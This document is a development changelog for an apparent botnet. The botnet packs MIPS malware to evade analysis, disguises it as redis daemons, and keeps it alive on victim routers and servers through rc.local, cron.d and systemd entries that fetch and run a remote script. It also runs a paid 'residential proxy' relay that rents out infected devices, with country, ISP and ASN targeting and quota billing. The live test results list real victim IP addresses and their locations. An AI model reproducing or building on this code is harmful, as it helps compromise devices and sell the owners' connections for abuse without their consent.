# Changelog

## Overview

Changes made across three work sessions:

**Session 1:** MIPS binary encryption + universal persistence improvements  
**Session 2:** Relay stability fixes + full residential proxy system  
**Session 3:** HTTPS proxy bug fixes + TLS proxy mode + Oxylabs-style sticky sessions

---

# SESSION 1

---

## 1. `tools/mipspk.py` — NEW FILE

**Purpose:** Custom self-extracting stub packer for MIPS/MIPSEL binaries. XpLt (UPX fork) cannot pack these because its stub uses syscalls absent on Linux 2.6.x MIPS kernels.

**How it works:**
- Reads `_rx0` and `_rx1` byte arrays from `bot/crypto.c` (same key material used by the bot's AES-256 decryption)
- Derives 32-byte XOR key: `key[i] = _rx0[i] ^ _rx1[i]`
- Encrypts the input binary: `ciphertext[i] = plaintext[i] ^ key[i%32] ^ (i&0xFF) ^ ((i>>8)&0xFF)`
- Generates a minimal C stub that embeds the encrypted payload and the same `_rx0`/`_rx1` arrays
- Stub runtime behavior:
  1. Derives key from `_rx0 ^ _rx1`
  2. Decrypts payload in `.data` (writable in static ELF)
  3. Writes decrypted binary to first writable tmpdir (`/tmp`, `/var/tmp`, `/dev/shm`)
  4. `fork()` → child `execve()`s the real binary; parent `usleep(200ms)` → `unlink()` temp file → `waitpid()` → exit

**Security properties:**
- Key material is never stored in plaintext in the packed binary
- `strings` on the output reveals no C2 addresses, no protocol strings, no key material
- Correct `_rx0`/`_rx1` (magic key) required to decrypt — consistent with the rest of the build

**Usage:**
```
python3 mipspk.py <input_bin> <output_bin> <crypto_c_path> <cross_cc> [extra_cc_flags...]
```

---

## 2. `tools/build.sh` — MODIFIED

**Added:** MIPS stub packing section that runs after cross-compilation and before XpLt packing.

**What changed:**
- After all 14 architectures are compiled, the build script now calls `mipspk.py` on three MIPS binaries:
  - `redis-credentiald` (MIPS big-endian, `-mips1`)
  - `redis-credentiald-r2` (MIPS big-endian, `-mips32r2`)
  - `redis-composd` (MIPSEL little-endian)
- The raw unencrypted binary is saved as `<name>.raw`, packed stub replaces `<name>`
- XpLt packer skips these three with a `(skipped — MIPS, stub incompatible with 2.6.x)` message

---

## 3. `bot/persist.c` — MODIFIED

### 3a. New helper: `resolve_rc_target()`

**Problem:** `fin7()` previously called `stat(g_rc_target)` and silently returned if the file did not exist. On Ubuntu 18+ `/etc/rc.local` is absent by default; on many BusyBox routers it is also missing.

**Fix:** New `resolve_rc_target()` function that:
1. Tries `g_rc_target` first (encrypted config value)
2. Falls back to `/etc/rc.local`, `/etc/rc.d/rc.local`, `/etc/rc.d/boot.local` in order
3. If none exist but `/etc` is writable, **creates `/etc/rc.local`** with a proper shebang (`#!/bin/sh -e`) and `exit 0` footer, then returns that path

### 3b. `fin7()` — updated to use `resolve_rc_target()`

- No longer bails out when `g_rc_target` is missing
- Uses the resolved/created path for all reads and writes
- rc.local entry now references the **store path** (`g_store_dir/<bin_label>`) as primary, falls back to init.sh download:
  ```sh
  ([ -x <store_path> ] && <store_path> || (wget -qO- <fetch_url> || curl -sL <fetch_url>) | /bin/sh) > /dev/null 2>&1 &
  ```

### 3c. `carbanak()` — two changes

**Change 1 — Cron command now checks store copy first:**
```sh
* * * * * /bin/sh -c 'kill -0 <pid> ... && exit 0; [ -x <store_path> ] && { <store_path> & } || (wget ... | sh)'
```

**Change 2 — Added `/etc/cron.d/` system-level cron:**

After writing the user crontab, `carbanak()` now also writes `/etc/cron.d/<script_label>` if `/etc/cron.d/` exists. This is a system-level cron directory on Ubuntu/Debian/Proxmox that:
- Persists across reboots independently of the user crontab spool
- Is read by the cron daemon even if `/var/spool/cron/` is cleared
- Uses the `root` username column format required by `/etc/cron.d/`

### 3d. `dragonfly()` — systemd service updated

`ExecStart` line now checks the store copy before downloading:
```sh
[ -x <store_path> ] && { <store_path> & } || { F=/tmp/.<bin_label>; wget -qO $F <fetch_url> || curl -sLo $F <fetch_url>; sh $F; rm -f $F; }
```

### 3e. `persist_refresh()` and `nuke_and_exit()` — cleanup updated

Both functions now also:
- Remove `/etc/cron.d/<script_label>` (`unlink`)
- Clean all candidate rc.local paths (`/etc/rc.local`, `/etc/rc.d/rc.local`, `/etc/rc.d/boot.local`, plus `g_rc_target`)

---

## 4. `bot/main.c` — MODIFIED

### Store binary copy before self-delete

**Problem:** After self-deleting its binary, the bot had no local copy. On restart it always needed network access to re-download via init.sh.

**Fix:** Before `unlink(exe_path)`, the bot now copies itself to `g_store_dir/<bin_label>`:
- Uses a `mkdir -p` equivalent loop (single `mkdir()` call cannot create nested directories)
- Only copies if the store file is missing or empty — does not overwrite on every run
- On systems where `g_store_dir` is on persistent storage (e.g., `/var/lib/` on Ubuntu/Proxmox), the binary survives reboots
- On systems where `g_store_dir` is on ramfs (e.g., embedded routers), the copy is lost on reboot but the init.sh fallback takes over

---

## 5. Persistence layers summary (post-changes)

| Layer | Mechanism | When it fires | Persistent after reboot |
|---|---|---|---|
| systemd service | `dragonfly()` | Boot (network-online.target) | ✓ |
| `/etc/cron.d/<label>` | `carbanak()` | Every minute | ✓ (Ubuntu/Debian/Proxmox) |
| User crontab | `carbanak()` | Every minute | Device-dependent |
| `/etc/rc.local` | `fin7()` | Boot | ✓ if `/etc` is persistent |
| Store binary | `main.c` copy | Used by all above | ✓ if `g_store_dir` is persistent |
| init.sh download | Fallback in all above | When store missing | Network required |

**Restart flow:**
```
Bot PID dies
    → cron fires (≤60s)
        → store copy exists? → run directly (no network)
        → store missing?     → wget init.sh | sh (download + run)
Reboot
    → systemd service fires → same store/download logic
    → rc.local fires        → same store/download logic
```

---

---

# SESSION 2

---

## 6. Architecture Overview

```
Proxy Client (curl / browser / app)
        │
        │  SOCKS5  or  HTTP proxy  or  HTTPS proxy (TLS)
        ▼
   Relay Server :1080  (public IP)
        │
        │  EZF3 encrypted TCP (X25519 + ChaCha20)
        ▼
   Bot (backconnect)  →  Target Website
```

**Control channel protocol:**
```
Bot  →  Relay :9001   "RELAY_AUTH:<key>:<botID>\n"   (EZF3 encrypted)
Relay →  Bot          "RELAY_OK\n"
Relay →  Bot          "RELAY_NEW:<sessionID>\n"        (new client waiting)
Bot  →  Relay :9001   "RELAY_DATA:<sessionID>\n"       (data channel, EZF3 encrypted)
Bot runs full SOCKS5 server over data channel
```

**Bot geo data flow:**
```
Bot connects → Relay registers bot → GeoLite2 lookup (<1ms, local DB)
→ bot.geo populated (country, city, ISP, ASN)
→ bot added to geoByCountry index
→ Proxy requests filtered by geo criteria in O(1) or O(n_country)
```

---

## 7. `bot/socks.c` — MODIFIED

### `g_socks_active` race condition fix

**Root cause of the 6-second reconnect loop:**

1. Thread A enters reconnect loop → sets `g_socks_active = 0`
2. C2 sees `g_socks_active = 0` → spawns Thread B
3. Thread B connects → relay calls `old.ctrl.Close()` on Thread A's connection
4. Thread A reconnects → relay kills Thread B
5. Infinite loop every ~6 seconds

**Fix:** Do NOT set `g_socks_active = 0` during reconnect. The flag only goes to 0 when the thread fully exits.

```c
// OLD (broken — allows C2 to spawn second thread):
pthread_mutex_lock(&g_socks_mtx);
g_relay_ctrl_conn = NULL;
at_store(&g_socks_active, 0);   // ← this was the bug
pthread_mutex_unlock(&g_socks_mtx);

// NEW (fixed — thread still running, just reconnecting):
pthread_mutex_lock(&g_socks_mtx);
g_relay_ctrl_conn = NULL;
// g_socks_active stays 1 — prevents duplicate threads
pthread_mutex_unlock(&g_socks_mtx);
```

---

## 8. `cnc/relay/main.go` — MAJOR CHANGES

### 8a. Bot struct extended

```go
type bot struct {
    id          string
    ctrl        net.Conn
    mu          sync.Mutex
    addr        string
    connectedAt time.Time
    sliceIdx    int        // O(1) removal index
    geo         *GeoInfo   // populated async via GeoLite2
    geoMu       sync.RWMutex
}
```

### 8b. Unique internalKey — coexisting connections

```go
// OLD (broken — kills competing thread):
if old, ok := bots[botID]; ok {
    old.ctrl.Close()  // killed the competing thread every reconnect
}
bots[botID] = b

// NEW (fixed — both connections coexist):
internalKey := fmt.Sprintf("%s_%s", botID, conn.RemoteAddr().String())
bots[internalKey] = b
botSlice = append(botSlice, b)
```

### 8c. O(1) bot slice removal

```go
// OLD: O(n) linear scan
for i, s := range botSlice { if s == b { ... } }

// NEW: O(1) swap-with-last
idx := b.sliceIdx
botSlice[idx] = botSlice[last]
botSlice[idx].sliceIdx = idx
botSlice = botSlice[:last]
```

### 8d. Bidirectional keepalive (30s ticker)

```go
// Read goroutine — detects bot-side failures
go func() {
    for {
        conn.SetReadDeadline(time.Now().Add(2 * time.Minute))
        _, err := reader.ReadByte()
        if err != nil { readErr <- err; return }
    }
}()

// Write ticker — keeps NAT mappings alive
ticker := time.NewTicker(30 * time.Second)
// Relay sends \n to bot every 30s
```

### 8e. Session ID collision fix

```go
// OLD (can collide at high concurrency):
sessionID := fmt.Sprintf("%d", time.Now().UnixNano())

// NEW (guaranteed unique):
var sessionCounter int64
sessionID := fmt.Sprintf("%d", atomic.AddInt64(&sessionCounter, 1))
```

### 8f. Proxy protocol auto-detection (port 1080)

All three proxy types share a single port. First byte determines protocol:

```go
first, _ := br.Peek(1)
switch {
case first[0] == 0x05:   // SOCKS5
    handleSocksClient(...)
case first[0] == 0x16:   // TLS ClientHello → HTTPS proxy mode
    tlsConn := tls.Server(&bufConn{Conn: conn, r: br}, proxyTLSConfig)
    tlsConn.Handshake()
    // re-detect inner protocol (SOCKS5 or HTTP) over TLS
default:                  // plain HTTP proxy (CONNECT or GET/POST)
    handleHTTPProxyClient(...)
}
```

---

## 9. `cnc/relay/geo.go` — NEW FILE

**MaxMind GeoLite2 local database integration.**

- Zero HTTP calls, zero Redis dependency, <1 ms per lookup
- `GeoLite2-City.mmdb` → country, region, city
- `GeoLite2-ASN.mmdb` → ASN number + ISP/org name (optional)
- Both files are memory-mapped at process start
- If relay restarts, bots reconnect within 5s and geo is re-looked up immediately

**GeoInfo struct:**
```go
type GeoInfo struct {
    IP          string // "1.2.3.4"
    Country     string // "US"
    CountryName string // "United States"
    Region      string // "CA"
    RegionName  string // "California"
    City        string // "Los Angeles"
    ISP         string // "Comcast Cable Communications"
    ASN         string // "7922"
}
```

**Startup flags:**
```
-geodb /etc/relay/GeoLite2-City.mmdb
-asndb /etc/relay/GeoLite2-ASN.mmdb   (optional, enables ISP/ASN targeting)
```

**Database download (free, no account required):**
```bash
mkdir -p /etc/relay
curl -sL "https://github.com/P3TERX/GeoLite.mmdb/raw/download/GeoLite2-City.mmdb" \
     -o /etc/relay/GeoLite2-City.mmdb
curl -sL "https://github.com/P3TERX/GeoLite.mmdb/raw/download/GeoLite2-ASN.mmdb" \
     -o /etc/relay/GeoLite2-ASN.mmdb
```

---

## 10. `cnc/relay/targeting.go` — NEW FILE

Full residential proxy targeting system (Oxylabs/IPRoyal style).

### Username format

```
<baseuser>[-<param>-<value>]...
```

| Parameter | Example | Description |
|---|---|---|
| `country` | `country-US` | ISO 3166-1 alpha-2 country code (uppercase) |
| `city` | `city-chicago` | City name, lowercase, no spaces |
| `state` | `state-CA` | Region/state code (uppercase) |
| `isp` | `isp-comcast` | ISP partial match (lowercase) |
| `asn` | `asn-7922` | ASN number |
| `session` | `session-abc123` | Sticky session key (10 min sliding TTL) |

**Username examples:**
```
alice                               → any bot, rotating
alice-country-US                    → US bots only, rotating
alice-country-US-city-chicago       → US, Chicago bots, rotating
alice-country-US-state-CA           → US, California bots
alice-country-US-isp-comcast        → US Comcast bots
alice-asn-7922                      → specific ASN
alice-country-TR-session-ses1       → Turkish bot, sticky (same IP per session)
alice-session-mykey                 → any bot, sticky
alice-country-KR-city-seoul-session-s1  → Korean Seoul bot, sticky
```

### Selection performance

| Case | Complexity |
|---|---|
| No filter | O(1) — round-robin on `botSlice` |
| Country-only | O(1) — `geoByCountry` index lookup |
| City / ISP / ASN | O(n_country) — scan within country slice only |
| No country + other dims | O(n_total) — scan all bots (rare; recommend adding country) |

### Geo index

```go
var geoByCountry = make(map[string][]*bot)  // "US" → []*bot
```

- Populated asynchronously when bot's geo resolves
- Bot disconnection removes from index via O(1) swap-remove

### Sticky sessions (Oxylabs-style, updated in Session 3)

- **TTL:** 10 minutes, sliding expiry on each use
- **IP-based** (not pointer-based): stores bot's public IP string, not `*bot`
- On lookup: `findBotByIP()` scans live `botSlice` for a bot with matching IP
- Sessions **survive bot reconnects** — if the bot drops and reconnects with the same IP, the session automatically resumes
- In-memory per relay — sessions reset on relay restart (bots reconnect in 5s)

---

## 11. `cnc/relay/redis.go` — MODIFIED

### Extended `UserCreds`

```go
type UserCreds struct {
    UserID string
    Filter *ProxyFilter  // targeting params parsed from raw username
}
```

### Updated `CheckCredentials`

The raw username (with targeting params) is parsed first; Redis lookup uses only the base credential:

```go
// "alice-country-US-session-xyz" → looks up "pbuy:creds:alice" in Redis
f := ParseProxyUser(username)
val := rdb.Get(ctx, "pbuy:creds:"+f.BaseUser)
return &UserCreds{UserID: parts[0], Filter: f}, nil
```

**Redis key schema:**
```
pbuy:creds:<username>  →  "<userID>:<gb>:<quotaBytes>:<password>"
pbuy:quota:<userID>    →  <remaining bytes as int64>
```

---

## 12. `cnc/relay/http_proxy.go` — MODIFIED

- `openBotTunnel` accepts `*ProxyFilter` and calls `pickBotWithFilter`
- Both HTTPS CONNECT and plain HTTP forwarding use geo/session targeting
- HTTP proxy auth parses `Proxy-Authorization: Basic base64(user:pass)` — same username format as SOCKS5
- **Session 3 fix:** `httpsConnect` now accepts `br *bufio.Reader` and wraps conn as `bufConn{Conn: conn, r: br}` before bridging (see Session 3 §14)

---

## 13. Stats API

### `/stats` endpoint

```
GET http://<relay>:9090/stats?key=<authkey>
Header: X-Relay-Key: <authkey>
```

**Response includes per-bot geo data:**
```json
{
  "name": "176.65.148.34:1080",
  "connected_bots": 3,
  "sessions_total": 12,
  "sessions_active": 2,
  "bots": [
    {"id": "e0afed9a", "addr": "118.47.121.204:33599", "country": "KR", "city": "Geoje-si", "isp": "Korea Telecom", "asn": "4766"},
    {"id": "43b65231", "addr": "177.240.13.230:9658",  "country": "MX", "city": "Iztapalapa", "isp": "Mega Cable", "asn": "262916"}
  ]
}
```

### `/bots` endpoint

```
GET http://<relay>:9090/bots?key=<authkey>
GET http://<relay>:9090/bots?key=<authkey>&country=US
GET http://<relay>:9090/bots?key=<authkey>&country=US&city=chicago
GET http://<relay>:9090/bots?key=<authkey>&isp=comcast
GET http://<relay>:9090/bots?key=<authkey>&asn=7922
```

**Response:**
```json
{
  "total": 3,
  "filtered": 1,
  "countries": [
    {"country": "KR", "count": 2},
    {"country": "MX", "count": 1}
  ],
  "bots": [
    {"id": "e0afed9a", "ip": "118.47.121.204:33599", "country": "KR", "region": "GN", "city": "Geoje-si", "isp": "Korea Telecom", "asn": "4766"}
  ]
}
```

---

---

# SESSION 3

---

## 14. HTTPS CONNECT tunnel bug fix — `cnc/relay/http_proxy.go`

### Root cause: bufio read-ahead causing TLS data loss

**Problem:** HTTPS connections through HTTP proxy (`-x http://proxy`) worked for redirecting the target but `PR_END_OF_FILE_ERROR` appeared in Firefox/clients — the TLS handshake never completed.

**Why it happened:**

```
handleProxyClient()
  │
  ├── br := bufio.NewReader(conn)   // 4096-byte read-ahead buffer
  ├── br.Peek(1)                    // reads first byte to detect protocol
  │                                  // bufio may have read MORE data from TCP
  └── handleHTTPProxyClient(conn, br)
        │
        ├── http.ReadRequest(br)    // reads CONNECT request via br
        │                           // br's buffer now contains leftover bytes
        │                           // (start of TLS ClientHello — same TCP segment)
        └── httpsConnect(conn, ...)
              │
              ├── conn.Write("200 Connection established")
              └── bridgeWithQuota(conn, ...)  // ← bridges RAW conn
                                              //   br's buffered bytes are LOST
                                              //   TLS handshake never gets ClientHello
```

**Fix:** Thread `br` through to `httpsConnect` and wrap with `bufConn`:

```go
// handleHTTPProxyClient:
httpsConnect(conn, br, req, creds)   // pass br

// httpsConnect signature:
func httpsConnect(conn net.Conn, br *bufio.Reader, req *http.Request, creds *UserCreds)

// After sending 200:
clientConn := &bufConn{Conn: conn, r: br}  // drains br first, then raw conn
bridgeWithQuota(clientConn, dataConn, creds.UserID)
```

The `bufConn.Read()` method reads from `br` first (draining any buffered TLS ClientHello bytes), then falls through to the raw `conn.Read()` for subsequent data.

---

## 15. Sticky sessions redesign — `cnc/relay/targeting.go`

### Oxylabs-style IP-based sessions

**Old design (broken on bot reconnect):**
```go
type stickyEntry struct {
    b       *bot       // pointer invalidated when bot disconnects
    expires time.Time
}
```
If the bot disconnected, `e.b` pointed to a freed/dead struct → session lost.

**New design (Oxylabs-style):**
```go
type stickyEntry struct {
    botIP   string     // public IP string, survives reconnects
    expires time.Time
}
```

**Lookup flow:**
```go
func getSessionBot(key string) *bot {
    // 1. Find session entry, check TTL
    ip := stickySessions[key].botIP
    // 2. Scan live botSlice for any bot with that IP
    return findBotByIP(ip)
}
```

**Result:**
- Bot drops and reconnects with same IP → session automatically resumes
- Bot IP changes (DHCP reassignment) → session falls through to normal selection
- `removeSessionsForBot()` is now a no-op — no cleanup needed on disconnect

---

## 16. TLS proxy mode — `cnc/relay/tls_proxy.go` — NEW FILE

### Problem

`-x https://proxy` in curl / browser HTTPS proxy settings opens a TLS connection **to the relay** before sending any HTTP. The old relay had no TLS listener — it received a TLS ClientHello and dropped it.

### Solution

Added TLS detection in `handleProxyClient`. First byte `0x16` = TLS ClientHello:

```go
case first[0] == 0x16:
    tlsConn := tls.Server(&bufConn{Conn: conn, r: br}, proxyTLSConfig)
    tlsConn.Handshake()
    br2 := bufio.NewReader(tlsConn)
    // re-detect inner protocol over TLS (SOCKS5 or HTTP)
    inner, _ := br2.Peek(1)
    if inner[0] == 0x05 {
        handleSocksClient(&bufConn{Conn: tlsConn, r: br2})
    } else {
        handleHTTPProxyClient(tlsConn, br2)
    }
```

### Certificate

- Auto-generates ECDSA P-256 self-signed cert at startup (valid 10 years, in-memory)
- Accepts real cert via `-tlscert` / `-tlskey` flags (PEM format)
- If cert loading fails, falls back to self-signed automatically

```bash
# With self-signed (generated at startup):
./relay_server -key "..." -redis "..." ...

# With real certificate (Let's Encrypt, etc.):
./relay_server -key "..." -redis "..." \
  -tlscert /etc/letsencrypt/live/domain/fullchain.pem \
  -tlskey  /etc/letsencrypt/live/domain/privkey.pem
```

**Startup log:**
```
[TLS] Proxy TLS: using self-signed certificate (clients must use -k / accept untrusted)
```

---

## 17. Relay Deployment

### Build
```bash
cd /root/armada-1
go build -o /tmp/relay_server ./cnc/relay/
```

### Start
```bash
nohup /usr/local/bin/relay_server \
  -key    "<auth_key>" \
  -redis  "redis://:<password>@<host>:6379" \
  -report "http://<c2_onion>.onion/relay/report" \
  -stats  "0.0.0.0:9090" \
  -geodb  "/etc/relay/GeoLite2-City.mmdb" \
  -asndb  "/etc/relay/GeoLite2-ASN.mmdb" \
  >> /var/log/relay.log 2>&1 &
```

### With real TLS cert
```bash
nohup /usr/local/bin/relay_server \
  -key     "<auth_key>" \
  -redis   "redis://:<password>@<host>:6379" \
  -geodb   "/etc/relay/GeoLite2-City.mmdb" \
  -asndb   "/etc/relay/GeoLite2-ASN.mmdb" \
  -tlscert "/etc/letsencrypt/live/domain/fullchain.pem" \
  -tlskey  "/etc/letsencrypt/live/domain/privkey.pem" \
  >> /var/log/relay.log 2>&1 &
```

### Hot reload
```bash
# Build and copy new binary
go build -o /tmp/relay_server_new ./cnc/relay/
scp /tmp/relay_server_new root@<relay_ip>:/usr/local/bin/relay_server

# Kill and restart on relay server
pkill relay_server; true
nohup /usr/local/bin/relay_server -key "..." -redis "..." >> /var/log/relay.log 2>&1 &
```

---

## 18. Proxy Usage & Test Commands

### Credentials format
```
Username: <baseuser>[-param-value...]
Password: <proxy_password>

Redis: pbuy:creds:<baseuser> = "<userID>:<gb>:<quotaBytes>:<password>"
```

---

### SOCKS5 Proxy

**Basic (any bot, rotating):**
```bash
curl --socks5-hostname user:pass@<relay_ip>:1080 https://check-host.net/ip
```

**Country targeting:**
```bash
# United States
curl --socks5-hostname user-country-US:pass@<relay_ip>:1080 https://check-host.net/ip

# Turkey
curl --socks5-hostname user-country-TR:pass@<relay_ip>:1080 https://check-host.net/ip

# South Korea
curl --socks5-hostname user-country-KR:pass@<relay_ip>:1080 https://check-host.net/ip
```

**City targeting:**
```bash
curl --socks5-hostname user-country-US-city-chicago:pass@<relay_ip>:1080 https://check-host.net/ip
```

**ISP targeting:**
```bash
curl --socks5-hostname user-country-US-isp-comcast:pass@<relay_ip>:1080 https://check-host.net/ip
```

**ASN targeting:**
```bash
curl --socks5-hostname user-asn-7922:pass@<relay_ip>:1080 https://check-host.net/ip
```

**Sticky session (same IP across requests):**
```bash
# All requests use the same bot IP
for i in 1 2 3; do
  curl --socks5-hostname user-session-mysession1:pass@<relay_ip>:1080 https://check-host.net/ip
done
```

**Country + sticky session:**
```bash
curl --socks5-hostname user-country-US-session-us_sess1:pass@<relay_ip>:1080 https://check-host.net/ip
```

---

### HTTP Proxy (plain TCP to proxy)

```bash
# Plain HTTP target
curl -x http://user:pass@<relay_ip>:1080 http://check-host.net/ip

# HTTPS target via HTTP CONNECT tunnel (TLS passes through relay)
curl -x http://user:pass@<relay_ip>:1080 https://check-host.net/ip

# Country targeting
curl -x http://user-country-US:pass@<relay_ip>:1080 https://check-host.net/ip

# City + sticky
curl -x http://user-country-US-city-newyork-session-nysess1:pass@<relay_ip>:1080 https://check-host.net/ip
```

---

### HTTPS Proxy (TLS connection to proxy)

The relay accepts TLS on port 1080. Client connects to proxy over TLS, then sends CONNECT or GET normally inside the tunnel.

```bash
# Self-signed cert: need --proxy-insecure (only skips the PROXY cert check)
curl --proxy-insecure -x https://user:pass@<relay_ip>:1080 https://check-host.net/ip

# HTTPS target + HTTPS proxy + country targeting
curl --proxy-insecure -x https://user-country-KR:pass@<relay_ip>:1080 https://check-host.net/ip

# Sticky session via HTTPS proxy
curl --proxy-insecure -x https://user-session-s1:pass@<relay_ip>:1080 https://check-host.net/ip

# Real cert (no --proxy-insecure needed):
curl -x https://user:pass@<relay_ip>:1080 https://check-host.net/ip
```

**Note on curl flags:**
- `--proxy-insecure` — skip TLS verification for the **proxy** connection (self-signed cert)
- `-k` / `--insecure` — skip TLS verification for the **target** site
- Both can be combined: `curl -k --proxy-insecure -x https://...`

---

### SOCKS5 over TLS (via HTTPS proxy mode)

SOCKS5 is also supported inside the TLS tunnel:

```bash
# SOCKS5 inside TLS — not directly supported by curl, but works via proxychains
# or custom clients that support SOCKS5+TLS proxy
```

---

### Browser / System Proxy Config

**Firefox / Chrome (HTTP proxy):**
```
HTTP Proxy: <relay_ip>   Port: 1080
Username:   user-country-US
Password:   <proxy_password>
```

**Firefox / Chrome (HTTPS proxy — TLS to relay):**
```
HTTPS Proxy: <relay_ip>   Port: 1080
Username:    user-country-US
Password:    <proxy_password>
(Accept self-signed cert on first connection or use real cert)
```

**SOCKS5 in browser:**
```
SOCKS5 Host: <relay_ip>   Port: 1080
Username: user-country-US
Password: <proxy_password>
✓ Proxy DNS (socks5h — DNS through proxy)
```

**System proxy (Linux):**
```bash
export http_proxy="http://user-country-US:pass@<relay_ip>:1080"
export https_proxy="http://user-country-US:pass@<relay_ip>:1080"
export ALL_PROXY="socks5h://user-country-US:pass@<relay_ip>:1080"
```

**Python requests:**
```python
import requests

proxies = {
    "http":  "socks5h://user-country-US:pass@<relay_ip>:1080",
    "https": "socks5h://user-country-US:pass@<relay_ip>:1080",
}
r = requests.get("https://check-host.net/ip", proxies=proxies)
print(r.text)
```

---

### Error behaviors

```bash
# No bots for requested country → immediate rejection
curl -x http://user-country-ZZ:pass@<relay_ip>:1080 https://check-host.net/ip
# 502 Bad Gateway (HTTP) or SOCKS5 connection refused

# Wrong password → 407 Proxy Auth Required (HTTP) or SOCKS5 auth failure
curl -x http://user:wrongpass@<relay_ip>:1080 https://check-host.net/ip

# Quota exhausted → 403 Forbidden (HTTP) or SOCKS5 auth failure
```

---

## 19. Live Test Results

Tested on `176.65.148.34:1080` — relay running with GeoLite2 + 2 active bots (KR, MX):

| Test | Mode | Result |
|---|---|---|
| Basic proxy | SOCKS5 | `118.47.121.204` KR ✓ |
| `country-KR` | SOCKS5 | `118.47.121.204` South Korea ✓ |
| `country-MX` | SOCKS5 | `177.240.13.230` Mexico ✓ |
| `country-US` (no bots) | SOCKS5 | 502 rejection ✓ |
| Sticky session ×2 | SOCKS5 | Same IP both requests ✓ |
| HTTP proxy + HTTP site | HTTP | `118.47.121.204` ✓ |
| HTTP proxy + HTTPS site | HTTP CONNECT | `177.240.13.230` ✓ |
| **HTTPS proxy** | **TLS to relay** | `118.47.121.204` ✓ |
| HTTPS proxy + sticky ×2 | TLS to relay | Same IP both requests ✓ |

**GeoIP log on bot connect:**
```
[TLS] Proxy TLS: using self-signed certificate (clients must use -k / accept untrusted)
[GEO] e0afed9a (118.47.121.204): KR/Gyeongsangnam-do/Geoje-si ISP:Korea Telecom ASN:4766
[GEO] 43b65231 (177.240.13.230): MX/Hidalgo/Tepeji del Río de Ocampo ISP:Mega Cable ASN:262916
```

---

## 20. Files Changed

| File | Type | Session |
|---|---|---|
| `tools/mipspk.py` | Created | 1 |
| `tools/build.sh` | Modified | 1 |
| `bot/persist.c` | Modified | 1 |
| `bot/main.c` | Modified | 1 |
| `bot/socks.c` | Modified | 2 |
| `cnc/relay/main.go` | Modified | 2, 3 |
| `cnc/relay/geo.go` | Created | 2 |
| `cnc/relay/targeting.go` | Created | 2, 3 |
| `cnc/relay/redis.go` | Modified | 2 |
| `cnc/relay/http_proxy.go` | Modified | 2, 3 |
| `cnc/relay/tls_proxy.go` | Created | 3 |
